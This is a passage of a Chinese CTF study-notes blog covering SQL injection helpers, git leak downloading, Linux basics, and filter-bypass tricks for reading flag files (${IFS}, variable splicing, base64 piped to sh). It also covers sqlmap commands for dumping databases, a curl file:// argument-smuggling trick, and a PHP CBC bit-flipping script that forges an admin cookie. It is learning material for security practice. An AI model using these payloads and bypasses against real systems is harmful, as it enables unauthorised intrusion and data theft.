–&gt;benchmark()：benchmark()用于测试某些特定操作的执行速度，第一个参数是执行次数，第二个是执行的表达式</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select 1 and benchmark(500000000,1);</span><br><span class="line">        #+------------------------------+</span><br><span class="line">        #| 1 and benchmark(500000000,1) |</span><br><span class="line">        #+------------------------------+</span><br><span class="line">        #|                            0 |</span><br><span class="line">        #+------------------------------+</span><br><span class="line">        #1 row in set (1.49 sec)</span><br></pre></td></tr></table></figure></li><li><p>ascii()–&gt;hex()、bin()</p></li><li><p>group_concat()–&gt;concat_ws()</p></li><li><p>ascii()–&gt;ord()：这两个函数在处理英文时效果一样，但是处理中文等时不一致</p></li></ul></li></ul><hr><h1 id="web框架"><a href="#web框架" class="headerlink" title="web框架"></a><big><center>web框架</center></big></h1><h2 id="python框架"><a href="#python框架" class="headerlink" title="python框架"></a>python框架</h2><p><code>os.environ</code>：python的环境变量，可能会在里面隐藏信息，本体是一个文件，绝对地址为 <code>/proc/self/environ</code></p><p><code>pickle</code>：用于序列化的库，序列化：<code>pickle.dumps(obj)</code>，反序列化：<code>pickle.loads(str)</code>（直接dump、load，即不加 s 时，是将序列化后的文本储存到文件中）</p><h3 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h3><h3 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h3><h2 id="PHP框架"><a href="#PHP框架" class="headerlink" title="PHP框架"></a>PHP框架</h2><h3 id="FatFreeFramework"><a href="#FatFreeFramework" class="headerlink" title="FatFreeFramework"></a>FatFreeFramework</h3><hr><h1 id="git"><a href="#git" class="headerlink" title="git"></a><big><center>git</center></big></h1><h2 id="git基础"><a href="#git基础" class="headerlink" title="git基础"></a><big>git基础</big></h2><p>HEAD：指向你正在工作中的本地分支的指针，可以将HEAD想象为当前分支的别名</p><p>git reflog：查看引用日志，记录分支和HEAD指向的历史，这些日志可以被删除，并非硬性</p><p>CommitID：reflog中会记录提交 ID，作为reset的参数可以退回到指定的提交处</p><p>git checkout – file_path_name：用于放弃单个文件的修改，注意 –两边有空格</p><p>git reset [–hard|soft|mixed|merge|keep] [commit|HEAD]：将当前分支重设到指定的</p><p>HEAD^：退回一个快照，^数量表示退回的步数</p><p>git status [-s]：命令用于查看在你上次提交之后是否有对文件进行再次修改，-s表简短</p><p><img src="/images/git%E6%8C%87%E4%BB%A4%E5%8F%AF%E8%A7%86%E5%8C%96.png"></p><center style="color:#C0C0C0;text-decoration:underline">对应的Git流程区域分别为    工作区 / 缓存区 / 提交历史</center><h2 id="git泄漏"><a href="#git泄漏" class="headerlink" title="git泄漏"></a><big>git泄漏</big></h2><p>在网页更新，上传过程中由于操作失误可能导致 git泄漏</p><p>特征：/.git可以访问，或遗留了 .swp，.php.bak，.php~ 等备份文件</p><p>对于 /.git可以访问的页面，尝试用 GitHack或 Linux中 wget命令下载 .git文件夹</p><p>GitHack依赖Python2.7环境：<code>python2 githack.py address/.git/</code></p><p>-r参数为递归下载，整站爬取：<code>wget -r address/.git</code></p><hr><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a><big><center>Linux</center></big></h1><h2 id="Linux基础"><a href="#Linux基础" class="headerlink" title="Linux基础"></a><big>Linux基础</big></h2><p>pwd：显示当前目录</p><p>dir 与 ls：显示指定目录内容，默认为当前目录</p><p>wget：下载命令，其中 -r参数为递归下载，相当于整站下载</p><p>浏览文件：</p><ul><li><p>cat：连接文件并打印</p></li><li><p>tac：连接文件，倒序打印</p></li><li><p>nl：链接文件并带行号打印</p></li><li><p>head：连接文件，打印开头几行</p></li><li><p>tail：连接文件，打印最后几行</p></li><li><p>more：逐页显示内容，便于阅读，自带 +/string 搜索功能，当 string 是 int 时会从那一行开始显示</p></li><li><p>less：目前理解为更高级的 more</p></li></ul><p>chmod u+x：提升文件权限，当出现 zsh permission 权限低时可用</p><p>grep：查找文件里符合条件的字符串（可正则），全称 Global Regular Expression Print，可直接对文件内容进行搜索，如在’/usr/src/Linux/Doc’目录下搜索带字符 串’magic’的文件：<code>grep magic /usr/src/Linux/Doc/*</code></p><p>../ 与 ./：父级目录与当前目录</p><p>&gt;：重定向输出，覆盖原有内容，<code>echo 'this is flag' > flag.txt</code> #若flag.txt不存在，则创建；若存在，则覆盖</p><p>&gt;&gt;：重定向输出，追加新内容</p><p>&lt;：从文件中获取输入</p><p>|：管道 (pipe)，以上一条命令的输出作为下一条命令的参数或输入</p><p>||：上一条命令执行失败后才执行下一条命令</p><p>&amp;&amp;：上一条命令执行成功后才执行下一条命令</p><p>?：通配符，匹配任意单个字符</p><p>$：声明变量</p><h2 id="❀花式catFlag❀"><a href="#❀花式catFlag❀" class="headerlink" title="❀花式catFlag❀"></a><big>❀花式catFlag❀</big></h2><ul><li><p>过滤空格：<code>\&lt;</code>，<code>\&gt;</code>，<code>\&lt;/</code>，<code>&#123; , &#125;</code>，<code>\$&#123;IFS&#125;</code>，<code>\$IFS\$1</code> - [数字随意]</p>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat flag.txt</span><br><span class="line"><span class="meta">cat$</span><span class="bash">&#123;IFS&#125;flag.txt</span></span><br><span class="line"><span class="meta">cat$</span><span class="bash">IFS<span class="variable">$9flag</span>.txt</span></span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">&#123;cat,flag.txt&#125;</span><br></pre></td></tr></table></figure></li><li><p>堆叠：当只有一个语句的时候，末尾无需分号，最后一个语句后面也无需分号</p></li><li><p>变量拼接 [前提是可以堆叠]：如下列代码对<code>flag</code>贪婪匹配</p>  <center><code>preg_match("/.*f.*l.*a.*g.*/", $input)</code></center>  <center>对 ↓ 策</center>  <center><code>$input：a=ag;b=fl;cat $b$a</code></center></li><li><p>sh命令执行：<code>echo YourShell|sh</code></p></li><li><p>b64编码：<code>echo YourB64|base64 -d</code></p></li><li><p>命令替换：反引号 <code>``</code> 框选的内容在命令中优先执行，执行结果返回到原本反引号的位置进行替换，例如<code>cat &#96;ls&#96;</code>会先 ls，返回当前目录下所有文件名，然后 cat 会把所有文件逐一连接、打印</p></li></ul><hr><h1 id="Tool"><a href="#Tool" class="headerlink" title="Tool"></a><big><center>Tool</center></big></h1><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a><big>sqlmap</big></h2><p>全自动 SQL扫描工具，<code>--batch</code> 一键开启全自动模式</p><ul><li>注入检测<ul><li><code>-u url</code>——检查GET参数注入点</li><li><code>-u url -data="id=1"</code>——检查POST参数注入点</li><li><code>-u url -H 'header=*'</code>——检查HEADER注入，星号表示手动标记注入点</li></ul></li><li>表单爆破<ul><li><code>-dbs</code>——查看数据库</li><li><code>-D database_name --tables</code>——查看表名</li><li><code>-D database_name -T table_name --columns</code>——查看列名</li><li><code>-D database_name -T table_name -C col1,col2... --dump</code>——查看列内容</li></ul></li></ul><h2 id="cURL"><a href="#cURL" class="headerlink" title="cURL"></a><big>cURL</big></h2><p>利用 URL语法在命令行下工作的文件传输工具，Windows自带，GET，POST，HEADERS等 curl都支持，和python中的requests差不多<code>curl baidu.com</code>，详情可以 curl –help</p><p>也可以访问本地文件：<code>curl file:///MyPhoto.png</code></p><p>还可以一行命令，多个访问：<code>curl baidu.com google.com</code></p><p>当服务端自身使用 curl发送 GET请求，且 GET内容可控时，可以获取服务端本地 flag</p><p>服务端的情况：<code>curl address.com/?key=$_GET['key']</code></p><p>利用多个访问与本地访问，传参为：<code>server.com/?key=anything file:///flag</code></p><h2 id="pip指定版本的包"><a href="#pip指定版本的包" class="headerlink" title="pip指定版本的包"></a><big>pip指定版本的包</big></h2><p><code>pip install lib==version</code></p><hr><h1 id="ENCRYPT"><a href="#ENCRYPT" class="headerlink" title="ENCRYPT"></a><big><center>ENCRYPT</center></big></h1><h2 id="CBC字符翻转攻击"><a href="#CBC字符翻转攻击" class="headerlink" title="CBC字符翻转攻击"></a><big>CBC字符翻转攻击</big></h2><p align='right'><small>还不太懂，暂先收录</small></p><p><a href="https://blog.csdn.net/u013577244/article/details/86310881?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3.not_use_machine_learn_pai&depth_1-utm_source=distribute.pc_relevant.no">CSDN相关文章</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="comment">#计算cipher</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">明文1：a:2:&#123;s:8:&quot;userna//r</span></span><br><span class="line"><span class="comment">明文2：me&quot;;s:5:&quot;admil&quot;;//l字母在第14个字节</span></span><br><span class="line"><span class="comment">明文3：s:8:&quot;password&quot;;s</span></span><br><span class="line"><span class="comment">明文4：:3:&quot;123&quot;;&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$cipher</span>=base64_decode(urldecode(<span class="string">&#x27;f0csYAAWDy%2FGlSsvWLr6NlCBad4p2U%2BXm2Rr2X07iytKd4r8V5tbO7%2FcxIib96eRDGUOMQclQgvxw2SZXOobWQ%3D%3D&#x27;</span>));</span><br><span class="line"><span class="variable">$temp</span>=<span class="variable">$cipher</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">设密文1[13]=A,解密(密文2)[13]=B,明文2[13]=C,</span></span><br><span class="line"><span class="comment">将A修改为A ^ C,则:</span></span><br><span class="line"><span class="comment">A ^ B = A ^ C ^ B = B ^ B = 0 = C</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//A  C X</span></span><br><span class="line"><span class="variable">$cipher</span>[<span class="number">13</span>]=chr(ord(<span class="variable">$cipher</span>[<span class="number">13</span>]) ^ ord(<span class="string">&#x27;l&#x27;</span>) ^ ord(<span class="string">&#x27;n&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(<span class="variable">$cipher</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算iv</span></span><br><span class="line"><span class="variable">$res</span>=base64_decode(<span class="string">&#x27;yeiydaYLG5RNzOPWaQgOkG1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7fQ==&#x27;</span>);<span class="comment">//这里放burp放回的base64数据</span></span><br><span class="line"><span class="variable">$iv</span>=base64_decode(urldecode(<span class="string">&#x27;TD9FI%2FvbrZn%2FSjbSD9bfSQ%3D%3D&#x27;</span>)); <span class="comment">//这里放cookie中的iv</span></span><br><span class="line"><span class="variable">$plaintext</span>=<span class="string">&#x27;a:2:&#123;s:8:&quot;userna&#x27;</span>;</span><br><span class="line"><span class="variable">$new_iv</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">16</span>; <span class="variable">$i</span> ++)&#123;</span><br><span class="line">    <span class="variable">$new_iv</span>=<span class="variable">$new_iv</span>.chr(ord(<span class="variable">$iv</span>[<span class="variable">$i</span>])^ord(<span class="variable">$res</span>[<span class="variable">$i</span>])^ord(<span class="variable">$plaintext</span>[<span class="variable">$i</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(<span class="variable">$new_iv</span>));</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
